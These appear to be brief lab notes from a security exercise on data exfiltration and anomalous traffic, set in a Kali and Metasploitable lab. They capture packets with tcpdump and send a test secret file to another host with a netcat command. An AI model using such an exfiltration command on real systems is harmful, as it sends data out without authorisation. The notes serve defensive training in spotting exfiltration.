--- Data Exfiltration and Anomalous Traffic ---
# Capture [trcap.png]
- Preparing traffic capture with command: sudo tcpdump -i eth1 -w nivel4_exfiltracion.pcap
# Capture [simulate.png]
- Connecting to Metasploit FTP usign command: nc 192.168.56.101 9000 < /home/msfadmin/secret.txt
# Capture [filetest.png]
- Loading a test file to simulate sensible information/credentials
- Using commands: echo "SecretPassword123" > secret.txt
# Capture [check.png]
- Verifying content in kali 
